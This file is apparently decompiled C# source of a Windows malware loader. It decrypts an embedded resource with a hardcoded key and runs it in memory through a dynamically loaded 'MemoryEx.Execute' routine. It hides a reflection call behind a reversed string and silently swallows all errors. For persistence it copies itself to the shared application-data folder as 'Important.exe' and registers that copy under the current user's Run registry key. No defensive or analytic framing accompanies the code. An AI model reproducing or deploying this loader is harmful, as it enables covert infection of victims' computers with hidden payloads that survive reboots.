using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[StandardModule]
internal sealed class lotoyaesabyek
{
	private static Thread _Thread1;

	private static Thread _Thread2;

	public static byte[] GetData(string ResourceName)
	{
		Assembly assembly = (Assembly)typeof(Assembly).GetMethod(Strings.StrReverse("ylbmessAgnitucexEteG"))!.Invoke(null, null);
		ResourceManager resourceManager = new ResourceManager("fwJSJWlGkvkeybaseayotol", assembly);
		return (byte[])resourceManager.GetObject(ResourceName);
	}

	public static object InvokeDll(ref byte[] _Bytes, ref string _Class, ref string _Sub, ref object _Parameters)
	{
		try
		{
			Assembly assembly = Assembly.Load(_Bytes);
			string text = Strings.Split(assembly.ToString(), ",", -1, (CompareMethod)0)[0] + ".";
			MethodInfo method = assembly.GetType(text + _Class)!.GetMethod(_Sub);
			object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(assembly.GetType(text + _Class)));
			return method.Invoke(RuntimeHelpers.GetObjectValue(objectValue), (object[])_Parameters);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[STAThread]
	public static void Main()
	{
		_Thread1 = new Thread(_Execute);
		_Thread1.Start();
		_Thread2 = new Thread(_StartWithWindows);
		_Thread2.Start();
	}

	public static void _Execute()
	{
		try
		{
			byte[] _Bytes = GetData("nAy1HfuR");
			string _Class = "MemoryEx";
			string _Sub = "Execute";
			object _Parameters = new object[4]
			{
				Application.get_ExecutablePath(),
				null,
				ChangeMethods.DeLock(GetData("nAy1Hf"), Encoding.Unicode.GetBytes("8a88047ba49d4e2aa03d725ad2bea6a8")),
				true
			};
			InvokeDll(ref _Bytes, ref _Class, ref _Sub, ref _Parameters);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void _StartWithWindows()
	{
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Important.exe");
		string path2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "Important.exe");
		try
		{
			if (!File.Exists(path2))
			{
				File.WriteAllBytes(path, File.ReadAllBytes(Application.get_ExecutablePath()));
				AddCurrentKey("818cdcf067c824a4e34f9293de3b15a9", path);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void AddCurrentKey(string name, string path)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue(name, path, RegistryValueKind.String);
	}
}
